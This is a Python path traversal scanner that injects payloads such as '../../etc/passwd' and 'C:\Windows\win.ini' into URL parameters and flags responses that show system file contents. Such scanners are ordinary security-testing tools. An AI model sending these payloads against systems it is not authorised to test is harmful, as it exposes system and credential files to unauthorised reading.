#!/usr/bin/env python3
"""
scanPathTraversal.py  
Path Traversal / Directory Traversal Scanner
"""

import sys
import os
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import ScannerUtils, RateLimiter

class PathTraversalScanner:
    def __init__(self, url):
        self.url = ScannerUtils.normalize_url(url)
        self.domain = ScannerUtils.get_domain(url)
        self.scan_time = datetime.now()
        self.results = {
            'scanner_name': 'Path Traversal Scanner',
            'url': self.url,
            'scan_time': self.scan_time.isoformat()
        }
        self.rate_limiter = RateLimiter(max_requests_per_second=5)

        # Payloads
        self.payloads = [
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "..%2F..%2Fetc%2Fpasswd",
            "....//....//etc/passwd",
            "/etc/passwd",
            "C:\\Windows\\win.ini",
            "..\\..\\Windows\\win.ini"
        ]

        # Success indicators
        self.linux_indicators = [
            "root:x:0:0:",
            "daemon:",
            "/bin/bash",
            "/bin/sh"
        ]

        self.windows_indicators = [
            "[extensions]",
            "[fonts]",
            "for 16-bit app support"
        ]

    def scan(self):
        ScannerUtils.print_banner("Path Traversal Scanner")
        print(f"🔍 Target: {self.url}\n")

        try:
            print("📤 Testing Path Traversal via URL parameters...")
            vulns = self.test_path_traversal()

            self.results['vulnerabilities'] = vulns
            self.analyze_risk()

            print(f"\n{'='*70}")
            print("✅ QUÉT HOÀN TẤT")
            print(f"{'='*70}\n")

            return True

        except Exception as e:
            print(f"❌ Lỗi: {e}")
            return False

    def test_path_traversal(self):
        vulnerabilities = []

        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)

        if not params:
            print("   ℹ️ No URL parameters")
            return vulnerabilities

        for param_name in params.keys():
            print(f"   Testing: {param_name}")

            for payload in self.payloads:
                self.rate_limiter.wait_if_needed()

                test_params = params.copy()
                test_params[param_name] = [payload]

                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                response = ScannerUtils.make_request(test_url)

                if response:
                    # Check for Linux indicators
                    for indicator in self.linux_indicators:
                        if indicator in response.text:
                            print(f"      ❌ VULNERABLE: /etc/passwd accessed")
                            vulnerabilities.append({
                                'parameter': param_name,
                                'payload': payload,
                                'type': 'Linux Path Traversal',
                                'indicator': indicator
                            })
                            break

                    # Check for Windows indicators
                    for indicator in self.windows_indicators:
                        if indicator in response.text:
                            print(f"      ❌ VULNERABLE: win.ini accessed")
                            vulnerabilities.append({
                                'parameter': param_name,
                                'payload': payload,
                                'type': 'Windows Path Traversal',
                                'indicator': indicator
                            })
                            break

                if vulnerabilities:
                    break

        if not vulnerabilities:
            print("   ✅ No Path Traversal found")

        return vulnerabilities

    def analyze_risk(self):
        total = len(self.results.get('vulnerabilities', []))

        self.results['is_vulnerable'] = total > 0
        self.results['total_vulnerabilities'] = total

        if total == 0:
            self.results['risk_level'] = 'Low'
            self.results['cvss_score'] = 0.0
            self.results['protection_score'] = 100
            self.results['assessment'] = '✅ NO PATH TRAVERSAL'
            self.results['issues'] = []
            self.results['protections'] = ["No path traversal vulnerabilities detected"]
        else:
            self.results['risk_level'] = 'Critical'
            self.results['cvss_score'] = 7.5
            self.results['protection_score'] = 0
            self.results['assessment'] = '🔴 PATH TRAVERSAL VULNERABILITY'
            self.results['issues'] = [f"{total} Path Traversal vulnerabilities found"]
            self.results['protections'] = []

def main():
    url = sys.argv[1] if len(sys.argv) > 1 else input("🔍 Enter URL: ").strip()
    if not url:
        print("❌ Please provide URL!")
        return

    scanner = PathTraversalScanner(url)
    if scanner.scan():
        ScannerUtils.print_result_summary(scanner.results)

if __name__ == "__main__":
    main()
